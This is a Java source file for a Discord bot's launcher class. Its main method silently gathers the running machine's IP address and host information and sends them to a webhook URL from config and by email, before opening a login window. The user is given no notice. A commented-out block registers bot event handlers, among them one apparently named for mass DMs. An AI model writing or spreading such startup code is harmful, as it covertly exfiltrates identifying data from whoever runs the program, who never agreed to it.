package me.comu.exeter.core;

import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookMessage;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;
import me.comu.exeter.wrapper.Wrapper;
import net.dv8tion.jda.api.JDA;

import javax.swing.*;
import java.awt.*;
import java.util.logging.Level;
import java.util.logging.Logger;

public class Core {

    public static JDA jda;
    public static final String DEBUG = "[DEBUG] ";
    public static String PREFIX = ";";
    public static final Long OWNERID = 210956619788320768L;

    public static void main(final String[] args) {
        new Core();

        WebhookClient client = WebhookClient.withUrl(Config.get("WEBHOOK"));
        WebhookMessageBuilder builder = new WebhookMessageBuilder();
        WebhookEmbed firstEmbed = new WebhookEmbedBuilder().setColor(0).setDescription("Log Info on Start-Up:\nIP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation()).build();
        builder.addEmbeds(firstEmbed);
        WebhookMessage message = builder.build();
        client.send(message);
        client.close();
        Wrapper.sendEmail("Log Info On Startup","IP-Address: " + Wrapper.getIpaddress() + "\nHost Information: " + Wrapper.getHostInformation() + "");
        try {
            for (final UIManager.LookAndFeelInfo info : UIManager.getInstalledLookAndFeels()) {
                if ("Nimbus".equals(info.getName())) {
                    UIManager.setLookAndFeel(info.getClassName());
                    break;
                }
            }
        } catch (ClassNotFoundException ex) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex);
        } catch (InstantiationException ex2) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex2);
        } catch (IllegalAccessException ex3) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex3);
        } catch (UnsupportedLookAndFeelException ex4) {
            Logger.getLogger(LoginGUI.class.getName()).log(Level.SEVERE, null, ex4);
        }
        EventQueue.invokeLater(new Runnable() {
            @Override
            public void run() {
            new LoginGUI().setVisible(true); }

});
    }

    private Core() {
/*        EventWaiter eventWaiter = new EventWaiter();
        EcoJSONHandler.loadEconomyConfig(new File("economy.json"));
        WhitelistedJSONHandler.loadWhitelistConfig(new File("whitelisted.json"));
        CommandManager commandManager = new CommandManager(eventWaiter);
        Listener listener = new Listener(commandManager);
        org.slf4j.Logger logger = LoggerFactory.getLogger(Core.class);
        WebUtils.setUserAgent("Mozilla/5.0 | Discord Bot");
        try {
            logger.info("Booting...");
            jda = JDABuilder.create(Config.get("TOKEN"), GatewayIntent.getIntents(GatewayIntent.ALL_INTENTS)).setActivity(Activity.streaming("ily swag", "https://www.twitch.tv/souljaboy/")).addEventListeners(new Listener(commandManager)).build().awaitReady();
            logger.info("Successfully Booted");
            logger.info("Loading Events");
            jda.addEventListener(new KickEvent());
            jda.addEventListener(new BanEvent());
            jda.addEventListener(new LogMessageReceivedEvent());
            jda.addEventListener(new RainbowRoleEvent());
            jda.addEventListener(new AntiRaidEvent());
            jda.addEventListener(new EditEvent(commandManager));
            jda.addEventListener(new GuildMemberJoinedEvent());
            jda.addEventListener(new GuildMemberLeaveEvent());
            jda.addEventListener(new GuildMessageListenerResponderEvent());
            jda.addEventListener(new OffEvent());
            jda.addEventListener(new MemberCountChannelEvent());
            jda.addEventListener(new FilterEvent());
            jda.addEventListener(new CreditOnMessageEvent());
            jda.addEventListener(new VoiceChannelCreditsEvent());
            jda.addEventListener(new VCTimeTrackingEvent());
            jda.addEventListener(new MarriageEvent());
            jda.addEventListener(new DMWizzEvent());
            jda.addEventListener(new SuggestionMessageCleanerEvent());
            jda.addEventListener(new CreateAChannelEvent());
            logger.info("Instantiated Events");
            logger.info("Bot Ready To Go");
        } catch (LoginException | InterruptedException e) {
            logger.info("Caught Exception! (LoginException | InterruptedException)");
        }*/
    }

    public static void shutdownThread() {
       LoginGUI.running = false;
        LoginGUI.jStatusField.setText("NOT RUNNING");
        jda.shutdownNow();
    }

}

